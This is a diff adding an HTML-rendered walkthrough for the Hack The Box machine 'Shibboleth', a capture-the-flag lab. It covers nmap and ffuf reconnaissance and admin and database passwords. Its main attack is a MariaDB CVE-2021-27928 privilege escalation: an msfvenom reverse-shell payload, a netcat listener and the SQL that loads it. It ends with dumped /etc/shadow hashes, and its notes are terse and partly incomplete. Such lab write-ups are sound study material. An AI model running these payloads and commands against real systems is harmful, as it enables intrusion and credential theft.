@@ -1,0 +1,66 @@
+
+		<head>
+			<style type="text/css" media="screen">
+				body,html{font-family:var(--markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", system-ui, "Ubuntu", "Droid Sans", sans-serif);font-size:var(--markdown-font-size,14px);padding:0 26px;line-height:var(--markdown-line-height,22px);word-wrap:break-word}body{padding-top:1em}h1,h2,h3,h4,h5,h6,ol,p,pre,ul{margin-top:0}h2,h3,h4,h5,h6{font-weight:400;margin-bottom:.2em}img{max-width:100%;max-height:100%}a{text-decoration:none}a:hover{text-decoration:underline}a:focus,input:focus,select:focus,textarea:focus{outline:1px solid -webkit-focus-ring-color;outline-offset:-1px}p{margin-bottom:.7em}ol,ul{margin-bottom:.7em}hr{border:0;height:2px;border-bottom:2px solid}h1{padding-bottom:.3em;line-height:1.2;border-bottom-width:1px;border-bottom-style:solid;font-weight:400}table{border-collapse:collapse}th{text-align:left;border-bottom:1px solid}td,th{padding:5px 10px}table>tbody>tr+tr>td{border-top:1px solid}blockquote{margin:0 7px 0 5px;padding:0 16px 0 10px;border-left-width:5px;border-left-style:solid}code{font-family:var(--vscode-editor-font-family, "SF Mono", Monaco, Menlo, Consolas, "Ubuntu Mono", "Liberation Mono", "DejaVu Sans Mono", "Courier New", monospace);font-size:1em;line-height:1.357em}body.wordWrap pre{white-space:pre-wrap}pre.hljs code>div,pre:not(.hljs){padding:16px;border-radius:3px;overflow:auto}pre code{color:var(--vscode-editor-foreground);tab-size:4}
+			</style>
+		</head>
+		<body>
+			<p><img src="PWND/Shibboleth.png" alt="image"></p>
+<h1 id="nmap">Nmap</h1>
+<pre><code>80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
+|_http-title: Did not follow redirect to http://shibboleth.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+</code></pre>
+<p>add the domain to /etc/hosts
+<img src="" alt="image"></p>
+<p>Access the website:
+<img src="" alt="image"></p>
+<p>checking vhosts </p>
+<p>ffuf -u <a href="http://shibboleth.htb/">http://shibboleth.htb/</a> -H &quot;HOST: FUZZ.shibboleth.htb&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-med
+ium-words.txt -mc 200</p>
+<p><img src="" alt="image"></p>
+<p> found monitor monitoring Monitor adding that to /etc/hosts</p>
+<p><img src="" alt="image"></p>
+<p> Team:</p>
+<p> walter white 
+ chief executirve officer </p>
+<p> sarah jhonson
+ product Manager </p>
+<p>  william anderson 
+  CTO</p>
+<p>  Amanda Jepson 
+  accountant</p>
+<p> loggin ?????</p>
+<p> Administrator:ilovepumkinpie1</p>
+<p> <img src="" alt="image"></p>
+<p> after doing so you will get a shell on the port you specifed. </p>
+<p> <img src="" alt="image"></p>
+<p> we cant test for sudo -l </p>
+<p> <img src="" alt="image">
+ <img src="" alt="image"></p>
+<p> we can now access my sql db </p>
+<p> <img src="" alt="image"></p>
+<p>checking version on mariadb </p>
+<p>database password: bloooarskybluh</p>
+<p><a href="https://github.com/Al1ex/CVE-2021-27928">https://github.com/Al1ex/CVE-2021-27928</a>
+found an exploit for 10.3.25</p>
+<p>Step 1: on kali generate payload.
+    sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.181 LPORT=6687 -f elf-so -o pwnd.so</p>
+<p>Step 2: Start a listener
+    nc -lnvp 6687</p>
+<p>Step 3: Via Dumpfile
+    python3 -c &#39;print(open(&quot;CVE-2021-27928.so&quot;, &quot;rb&quot;).read().hex())&#39;
+    mysql -u <user> -p -h <ip>
+    SELECT UNHEX(&#39;PYTHON_OUTPUT&#39;) into dumpfile &#39;/tmp/CVE-2021-27928.so&#39;;</p>
+<p>Step 4: Execute the Payload
+    mysql -u <user> -p -h <ip>
+    SET GLOBAL wsrep_provider=&quot;/tmp/CVE-2021-27928.so&quot;;</p>
+<p><img src="" alt="image"></p>
+<p>cat /etc/shadow </p>
+<p>root:$6$HeRqkRJL9pttp4EY$TBE4vztPy9lOaywPhVdhQHwiPa09s7RJw418EMjmS0RKea/1QBwLqTHK84ato5yDBF59dMvSNbQQ1pVy.K1dp.:18741:0:99999:7::: </p>
+<p>PasswordHash: For PDF in ~/Downloads</p>
+<p>ipmi-svc:$6$rnKUQQE9QwT1bVVt$7JWeqxtaYfMZa0EO0clguLK4Fh3N/IN6djXUl2M2MQ5PHVmQ1vLwlxnNMVhn7y/oEpjltVyvbw1wbBBZ//apV.:18925:0:99999:7::: </p>
+
+		</body>
